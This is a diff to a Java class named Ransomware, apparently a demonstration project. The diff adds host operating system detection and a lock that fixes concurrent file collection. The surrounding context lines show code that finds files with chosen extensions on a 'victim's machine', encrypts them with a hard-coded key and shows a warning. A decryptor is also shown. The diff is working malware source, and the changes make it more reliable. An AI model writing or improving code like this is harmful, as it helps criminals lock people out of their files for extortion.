@@ -14,10 +14,29 @@ public class Ransomware {
     protected static final List<String> encryptedFiles = new LinkedList<>();
 
     public static void main(String[] args) {
+        OS os = getHostOs();
+        System.out.println("The host OS is : " + os);
         var targetDirectories = getTargetDirectories();
         List<File> files = fileFinder(targetDirectories);
         encryptAll(files);
         warning();
+    }
+
+    /**
+     * Returns the host operating system
+     *
+     * @return OS enum
+     */
+    private static OS getHostOs() {
+
+        String os = (String) System.getProperties().get("os.name");
+        if ( os.toLowerCase().contains("mac") ) {
+            return OS.MAC;
+        }
+        if ( os.toLowerCase().contains("window") ) {
+            return OS.WINDOWS;
+        }
+        return OS.LINUX;
     }
 
     private static void encryptAll(List<File> files) {
@@ -32,6 +51,7 @@ public class Ransomware {
 
     /**
      * target directories to start the file encryption
+     *
      * @return list of directories
      */
     private static List<String> getTargetDirectories() {
@@ -41,7 +61,7 @@ public class Ransomware {
     }
 
     private static void decryptor(String path) throws CryptoException {
-        File file = new File(path  + Constants.SUFFIX);
+        File file = new File(path + Constants.SUFFIX);
         File decFile = new File(path);
         CryptoUtils.decrypt(Constants.SECRET_KEY, file, decFile);
         file.delete();
@@ -53,12 +73,13 @@ public class Ransomware {
 
     /**
      * Encrypts the file at the path provided
+     *
      * @param path absolute path to file
      * @throws CryptoException
      */
     private static void encryptor(String path) throws CryptoException {
         File file = new File(path);
-        synchronized (Ransomware.class){
+        synchronized (Ransomware.class) {
             encryptedFiles.add(path);
         }
         File encFile = new File(path + Constants.SUFFIX);
@@ -67,24 +88,24 @@ public class Ransomware {
     }
 
     /**
-     * finds important files on victim's machine
-     *
-     * @return
+     * finds files on victim's machine with configured extensions
+     * @param targetDirectories the directory to look into
+     * @return list paths of the files
      */
     private static List<File> fileFinder(List<String> targetDirectories) {
 
         List<File> targetFiles = new ArrayList<>();
-
         targetDirectories.parallelStream().forEach(d -> {
             try {
                 File root = new File(d);
                 var files = FileUtils.listFiles(root, Constants.EXTENSIONS, true);
-                targetFiles.addAll(files);
+                synchronized (targetFiles) { // lock since multiple threads will add
+                    targetFiles.addAll(files);
+                }
             } catch (Exception e) {
                 e.printStackTrace();
             }
         });
-
         return targetFiles;
     }
 
@@ -95,7 +116,7 @@ public class Ransomware {
             Thread.ofVirtual().start(() -> {
                 try {
                     decryptor(file);
-                    synchronized (Ransomware.class){
+                    synchronized (Ransomware.class) {
                         encryptedFiles.remove(file);
                     }
                 } catch (CryptoException e) {
